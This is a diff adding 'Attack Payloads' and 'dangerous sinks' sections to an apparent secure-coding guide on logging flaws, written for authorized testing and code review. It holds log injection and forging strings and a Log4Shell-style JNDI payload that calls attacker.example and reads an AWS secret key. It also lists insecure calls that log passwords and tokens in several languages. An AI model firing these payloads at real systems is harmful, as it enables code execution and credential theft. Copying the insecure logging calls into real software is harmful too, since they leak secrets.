@@ -31,6 +31,114 @@ The unsafe assumption is that logs are internal and therefore safe for verbose o
 | **Log injection** | User input embedded in log messages without sanitization |
 | **Admin activity gaps** | Privileged actions without immutable audit trail |
 
+## Attack Payloads
+
+Use these in authorized tests when user input appears in log messages or when reviewing log aggregation exposure.
+
+### Pattern 1: Log injection (CRLF / forged lines)
+
+```text
+username=admin%0aINFO User admin logged out successfully
+username=legit%0d%0aERROR Security audit: privilege escalation approved
+event=login%0a2024-01-01 INFO admin granted superuser
+```
+
+Forged newlines may confuse operators or SIEM parsers that treat each line as a separate event.
+
+### Pattern 2: Log forging via Unicode / homoglyphs
+
+```text
+username=аdmin  # Cyrillic 'а' — looks like "admin" in log review
+username=\u001b[31madmin  # ANSI escape in terminals that render color
+```
+
+### Pattern 3: Sensitive data in query strings (Referer leakage)
+
+```text
+GET /login?username=victim&password=Secret123
+Referer: https://app.example/dashboard?token=eyJhbG...
+```
+
+Even when not logged by the app, proxies and analytics may capture query parameters.
+
+### Pattern 4: Verbose exception logging
+
+```text
+# Trigger validation error; stack trace includes:
+# connection string, API key in local variable dump, Authorization header
+```
+
+### Pattern 5: Log4Shell-style JNDI (legacy)
+
+```text
+${jndi:ldap://attacker.example/a}
+${env:AWS_SECRET_ACCESS_KEY}
+```
+
+Review JNDI lookup patterns in Java logging configuration for legacy deployments.
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```python
+app.logger.info("Login user=%s password=%s", user, password)
+logger.debug("Request: %s", request)  # entire Flask/Django request
+logger.info(f"Token: {token}")
+structlog.get_logger().info("auth", authorization=headers["Authorization"])
+print(request.headers)  # stdout captured by container logs
+logging.basicConfig(level=logging.DEBUG)  # in production settings
+```
+
+Also review: `urllib3` debug, SQLAlchemy `echo=True`, Celery task logs with args.
+
+### Java
+
+```java
+logger.info("Login user={} password={}", username, password);
+log.debug("JWT {}", jwtToken);
+System.out.println("DB URL: " + jdbcUrl);
+log.error("Failed payment", exception);  // exception message contains PAN
+MDC.put("ssn", ssn);  // mapped diagnostic context in every line
+org.apache.logging.log4j.core.lookup.JndiLookup  // legacy config
+```
+
+### C#
+
+```csharp
+_logger.LogInformation("Password {Password}", password);
+_logger.LogDebug("Request {@Request}", request);  // destructures all properties
+Console.WriteLine($"Connection: {connectionString}");
+_logger.LogError(ex, "Payment failed for {Pan}", cardNumber);
+Serilog destructuring of sensitive objects without masking
+```
+
+### Go
+
+```go
+log.Printf("login user=%s password=%s", user, pass)
+log.Printf("auth header=%s", r.Header.Get("Authorization"))
+fmt.Println(req)  // httputil.DumpRequest output
+zap.String("token", token)
+log.SetFlags(log.LstdFlags | log.Lshortfile) // with secrets in messages
+```
+
+### JavaScript
+
+```javascript
+console.log('User login:', { username, password });
+console.log('Headers:', req.headers);
+logger.info(`Stripe key: ${process.env.STRIPE_SECRET}`);
+debug('session', req.session);  // debug package in production
+```
+
+### Shell / infrastructure
+
+```bash
+export DATABASE_URL="postgres://user:pass@host/db"  # visible in /proc, docker inspect
+kubectl logs deployment/api  # env vars printed at startup
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
